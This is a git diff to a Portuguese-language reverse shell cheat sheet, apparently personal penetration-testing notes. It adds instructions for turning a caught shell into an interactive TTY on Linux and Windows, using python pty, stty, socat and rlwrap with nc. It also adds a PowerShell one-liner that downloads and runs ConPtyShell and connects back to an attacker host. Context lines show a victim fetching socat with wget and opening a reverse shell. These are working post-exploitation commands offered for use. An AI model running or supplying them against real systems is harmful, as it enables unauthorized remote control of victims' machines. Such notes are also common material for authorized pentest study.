@@ -43,6 +43,14 @@ Mais pra frente vou fazer um post no [Blog](https://0x4rt3mis.github.io) detalha
     - [War](#war)
     - [Socat](#socat)
 - [Shell Interativo](#shell-interativo)
+    - [TTY Linux](#tty-linux)
+        - [TTY Shell de um Interpretador](#TTY-Shell-de-um-Interpretador)
+        - [TTY Shell do Socat](#TTY-dShell-do-Socat)
+    - [TTY Windows](#TTY-Windows)
+        - [TTY Shell com rlwrap](#TTY-Shell-com-rlwrap)
+        - [Pseudo Console (ConPty)](#Pseudo-Console-(ConPty))
+
+- [Referências](#referências)
 
 # Reverse Shell
 
@@ -436,8 +444,118 @@ user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0
 user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 ```
 
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
-https://github.com/andrew-d/static-binaries
-https://github.com/samratashok/nishang/tree/master/Shells
+# Shell Interativo
+
+## TTY Linux
+
+### TTY Shell de um Interpretador
+
+Assim que pegar o shell na máquina, e vier aquele shell que não é interativo,muito ruim de trabalhar, digite
+
+```sh
+/usr/bin/script -qc /bin/bash /dev/null
+```
+
+Ou um desses aqui, geralmente eu uso o python
+
+```sh
+python -c 'import pty;pty.spawn("/bin/bash");'
+python -c 'import pty;pty.spawn("/bin/sh");'
+python3 -c 'import pty;pty.spawn("/bin/bash");'
+python3 -c "__import__('pty').spawn('/bin/bash')"
+python3 -c "__import__('subprocess').call(['/bin/bash'])"
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+perl -e 'print `/bin/bash`'
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+```
+Ai aperter `CTRL + Z`
+
+Após isso digite (sim, na minha máquina mesmo, a atacante)
+```sh
+stty raw -echo
+```
+Ai digite `fg` e de `duas vezes enter`
+
+Caso de erro digite: `reset`
+Caso ele peça terminal digite: `xterm-color`
+Caso ele esteja com bugs ainda: `export TERM=xterm`
+
+Isso já vai te dar um shell bacana, mas tu vai ver que vai começar a dar uns bugs caso venha comandos muito grandes, ai o ideal é ajustar o `stty` dele
+
+Digite isso
+
+```sh
+stty rows 37 columns 173
+```
+
+Esse foi o método que mais utilizo pra deixar o shell interativo
+
+### TTY Shell do Socat
+
+Depois de pegar o shell ruim, digite...
+
+```sh
+socat file:`tty`,raw,echo=0 tcp-listen:12345
+```
+
+## TTY Windows
+
+### TTY Shell com rlwrap
+
+Rlwrap é muito bom com windows, quando temos o cmd.
+
+Quando for abrir o listener, ao invés de abrir normal com o nc, abra com o `rlwrap` antes do nc
+
+```sh
+rlwrap nc 10.0.0.1 4242
+```
+
+Ou
+
+```sh
+rlwrap -r -f . nc 10.0.0.1 4242
+# -f . -> vai fazer o rlwrap usar do histórico local para auto completamento.
+# -r -> Vai ajudar no autocompletamento também.
+```
+
+### Pseudo Console (ConPty)
+
+Esse particularmente é muito interessante, nunca tinha usado mas vi que da certo e vou começar a usar também.
+
+Ele usa a função [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole)
+
+Servidor
+
+```sh
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+```
+
+Cliente
+
+```powershell
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+```
+
+Ou temos o offline dele, caso a rede atacada não tenha acesso à Internet.
+
+`https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1`
+
+
+# Referências
+
+[Pentest Monekey - 
+Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+[Reverse Bash One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
+
+[Payload All The Things - Reverse Shel Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+[Static Binaries - Andrew-d](https://github.com/andrew-d/static-binaries)
+
+[Suite Nishang](https://github.com/samratashok/nishang/tree/master/Shells)
+
+[ConPtyShell - Windows](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1)
+
+[Create Pseudo Console - Windows](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole)
